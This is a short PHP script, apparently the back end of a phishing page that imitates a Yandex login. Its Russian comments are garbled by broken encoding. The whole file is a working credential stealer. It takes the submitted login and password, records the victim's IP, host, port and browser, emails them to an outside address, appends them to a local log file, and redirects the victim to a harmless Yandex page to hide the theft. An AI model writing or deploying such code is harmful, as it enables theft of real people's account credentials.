<?PHP
$Login = $_POST['login']; //�����
$Browser = getenv("HTTP_USER_AGENT");
$Port = getenv("REMOTE_PORT");
$Connect = $_SERVER['HTTP_CONNECTION'];
$Host = gethostbyaddr(getenv("REMOTE_ADDR")); 
$Pass = $_POST['passwd']; // ������
$ip = $_SERVER["REMOTE_ADDR"]; // IP ������
$Data = date("d-m-y H:i:s", time()); // ���� � �����

$text = "[$Data] Browser:[$Browser] Port:[$Port] Connect:[$Connect] Host:[$Host] IP:$ip ����:$Login@yandex.ru ����:$Pass";
$to = "superhacker88@yandex.ru"; // ���� ��������� ������ ( E-mail ������ )
$sub = " ������ �� �����: $Login@yandex.ru"; // ���� ������
mail($to,$sub,$text); // �������� ��������� � ���������� ���� �� E-mail

$filelog = fopen("base.php","a+"); //��������� ���� ����
fwrite($filelog,"\n $text \n"); //���������� ��
fclose($filelog); //���������

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://cards.yandex.ru/card.xml?card_id=2072'></head></html>";
?>
